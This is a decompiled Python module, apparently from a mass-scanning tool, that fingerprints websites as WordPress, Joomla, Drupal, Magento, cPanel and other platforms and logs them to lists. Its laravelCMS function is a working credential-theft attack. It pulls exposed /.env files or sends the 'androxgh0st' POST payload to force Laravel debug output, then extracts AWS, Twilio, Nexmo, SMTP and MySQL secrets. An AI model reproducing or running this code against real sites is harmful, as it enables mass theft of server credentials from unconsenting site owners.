# uncompyle6 version 2.11.5
# Python bytecode 2.7 (62211)
# Decompiled from: Python 2.7.18 (default, Apr 20 2020, 20:30:41) 
# [GCC 9.3.0]
# Embedded file name: Tools\cms.py
import requests
from tool import get_smtp
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
r = '\x1b[31m'
g = '\x1b[32m'
y = '\x1b[33m'
b = '\x1b[34m'
m = '\x1b[35m'
c = '\x1b[36m'
w = '\x1b[37m'
Headers = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0'}

def wordpressCMS(site):
    try:
        CheckWp = requests.get('https://'+site, timeout=10, headers=Headers).content
        if '/wp-content/' in str(CheckWp) or '/wp-inclues/' in str(CheckWp):
            with open('cms/Wordpress.txt', 'a') as XW:
                XW.write(site + '\n')
                print(f"{b}[Wordpress]: {c}{site}")
            return 'wordpress'
    except Exception as e:
            pass
    try:
        CheckWp2 = requests.get(f'http://' + site + '/wp-includes/js/jquery/jquery.js', timeout=10, headers=Headers).content
        if '(c) jQuery Foundation' in str(CheckWp2):
            with open('cms/Wordpress.txt', 'a') as XW:
                XW.write(site + '\n')
                print(f"{b}[Wordpress]: {c}{site}")
            return 'wordpress'
    except Exception as e:
            pass

def joomlaCMS(site):
    try:
        CheckJom = requests.get('http://' + site + '/administrator/help/en-GB/toc.json', timeout=10, headers=Headers).content
        if '"COMPONENTS_BANNERS_BANNERS"' in str(CheckJom):
            with open('cms/joomla.txt', 'a') as XW:
                XW.write(site + '\n')
                print(f"{b}[joomla]: {c}{site}")
            return 'joomla'
    except Exception as e:
            pass
    try:
        CheckJom2 = requests.get('http://' + site + '/administrator/language/en-GB/install.xml', timeout=10, headers=Headers).content
        if '<author>Joomla!' in str(CheckJom2):
            with open('cms/joomla.txt', 'a') as XW:
                XW.write(site + '\n')
                print(f"{b}[joomla]: {c}{site}")
            return 'joomla'
    except Exception as e:
        pass
    try:
        CheckJom3 = requests.get('http://' + site + '/plugins/system/debug/debug.xml', timeout=10, headers=Headers).content
        if '<author>Joomla!' in str(CheckJom3):
            with open('cms/joomla.txt', 'a') as XW:
                XW.write(site + '\n')
                print(f"{b}[joomla]: {c}{site}")
            return 'joomla'
    except Exception as e:
        pass
    try:
        CheckJom4 = requests.get('http://' + site + '/administrator/', timeout=10, headers=Headers).content
        if 'content="Joomla!' in str(CheckJom4):
            with open('cms/joomla.txt', 'a') as XW:
                XW.write(site + '\n')
                print(f"{b}[joomla]: {c}{site}")
            return 'joomla'
    except Exception as e:
            pass

def drupalCMS(site):
    try:
        CheckDrupal = requests.get('http://' + site + '/misc/ajax.js', timeout=10, headers=Headers).content
        if 'Drupal.ajax' in str(CheckDrupal):
            with open('cms/drupal.txt', 'a') as XW:
                XW.write(site + '\n')
                print(f"{b}[drupal]: {c}{site}")
            return 'drupal'
    except Exception as e:
            pass

    try:
        CheckDrupal2 = requests.get('https://'+site, timeout=10, headers=Headers).content
        if '/sites/default/files' in str(CheckDrupal2):
            with open('cms/drupal.txt', 'a') as XW:
                XW.write(site + '\n')
                print(f"{b}[drupal]: {c}{site}")
            return 'drupal'
    except Exception as e:
            pass

def opencardCMS(site):
    try:
        CheckOpencart = requests.get('http://' + site + '/admin/view/javascript/common.js', timeout=10, headers=Headers).content
        if 'getURLVar(key)' in str(CheckOpencart):
            with open('cms/opencart.txt', 'a') as XW:
                XW.write(site + '\n')
                print(f"{b}[drupal]: {c}{site}")
            return 'opencart'
    except Exception as e:
            pass

def oscomCMS(site):
    try:
        CheckOsCommerce = requests.get('http://' + site + '/admin/includes/general.js', timeout=10, headers=Headers).content
        if 'function SetFocus()' in str(CheckOsCommerce):
            with open('cms/oscommerce.txt', 'a') as XW:
                XW.write(site + '\n')
                print(f"{b}[drupal]: {c}{site}")
            return 'oscommerce'
    except Exception as e:
            pass

def vBullet(site):
    try:
        Checkvb = requests.get('http://' + site + '/images/editor/separator.gif', timeout=10, headers=Headers).content
        if 'GIF89a' in str(Checkvb):
            with open('cms/vBulletin.txt', 'a') as XW:
                XW.write(site + '\n')
                print(f"{b}[vBullet]: {c}{site}")
            return 'vBulletin'
    except Exception as e:
            pass
    try:
        Checkvb2 = requests.get('http://' + site + '/js/header-rollup-554.js', timeout=10, headers=Headers).content
        if 'js.compressed/modernizr.min.js' in str(Checkvb2):
            with open('cms/vBulletin.txt', 'a') as XW:
                XW.write(site + '\n')
                print(f"{b}[vBullet]: {c}{site}")
            return 'vBulletin'

        if 'content="vBulletin' in Checkvb2:
            with open('cms/vBulletin.txt', 'a') as XW:
                XW.write(site + '\n')
                print(f"{b}[vBullet]: {c}{site}")
            return 'vBulletin'
    except Exception as e:
            pass

def prestashopCMS(site):
    try:
        Checkvb2 = requests.get('http://'+ site +'/js/header-rollup-554.js', timeout=10, headers=Headers).content
        if 'var prestashop =' in Checkvb2:
            with open('cms/prestashop.txt', 'a') as XW:
                XW.write(site + '\n')
                print(f"{b}[prestashop]: {c}{site}")
            return 'prestashop'
    except Exception:
        pass
        
def laravelCMS(site):
    try:
        get_source = requests.get("https://"+site+"/.env", headers=Headers, timeout=5, verify=False, allow_redirects=False).text
        if "APP_KEY=" in get_source or "APP_NAME=" in get_source:
            print(f"{b}[laravel]: {c}{site}")
            with open('result/laravel.txt','a') as wx:
                wx.write(site + "/.env\n")
            get_smtp.get_aws(get_source)
            get_smtp.get_nexmo(get_source)
            get_smtp.get_twillio(get_source)
            get_smtp.get_smtp(url=site,text=get_source)
            get_smtp.get_mysql(url=site,text=get_source)
            return "laravel"
        else:
            get_source = requests.post("https://"+site, data={"0x[]":"androxgh0st"}, headers=Headers, timeout=8, verify=False, allow_redirects=False).text
            if "<td>APP_KEY</td>" in get_source:
                print(f"{b}[laravel]: {c}{site}")
                with open('result/laravel.txt','a') as wx:
                    wx.write(site + "/.env\n")
                get_smtp.get_aws(get_source)
                get_smtp.get_nexmo(get_source)
                get_smtp.get_twillio(get_source)
                get_smtp.get_smtp(url=site,text=get_source)
                get_smtp.get_mysql(url=site,text=get_source)
                return 'laravel'
    except Exception as e:
        pass

def MageCMS(site):
    try:
        mage2 = requests.get('http://' + site + '/RELEASE_NOTES.txt',timeout=10,headers=Headers)
        if 'magento' in mage2.text:
            with open('cms/magento','a') as XW:
                XW.write(site + '\n')
                print(f"{b}[Magento]: {c}{site}")
            return 'magento'
    except Exception as e:
            pass
    try:
        mage4 = requests.get(f'http://' + site + '/index.php',timeout=10,headers=Headers)
        if '/mage/' in mage4.text or 'magento' in mage4.text:
            with open('cms/magento','a') as XW:
                XW.write(site + '\n')

            return 'magento'
    except Exception as e:
            pass
    try:
        mage5 = requests.get(f'http://' + site + '/errors/design.xml',timeout=10,headers=Headers)
        if mage5.status_code == 200 and "magento" in mage5.text:
            with open('cms/magento','a') as XW:
                XW.write(site + '\n')

            return 'magento'
    except Exception as e:
            pass

def cpanelCMS(site):
    try:
        cpa = requests.get(f'https://' + site + ':2087',timeout=10,headers=Headers)
        if cpa.status_code == 200 or cpa.status_code == 302:
            with open('cms/cpanel.txt','a') as XW:
                XW.write(site + '\n')

            return 'cpanel'
    except Exception as e:
            pass

def DetectCMS(site):
    try:
        statuss = requests.get("https://"+site,timeout=10,headers=Headers)
        if statuss.status_code == 200:
            cms_functions = [wordpressCMS, joomlaCMS, drupalCMS, opencardCMS, oscomCMS, vBullet, prestashopCMS, laravelCMS, MageCMS, cpanelCMS]
            for cms_function in cms_functions:
                result = cms_function(site)
                if result is not None:
                    return result
    except Exception as e:
         pass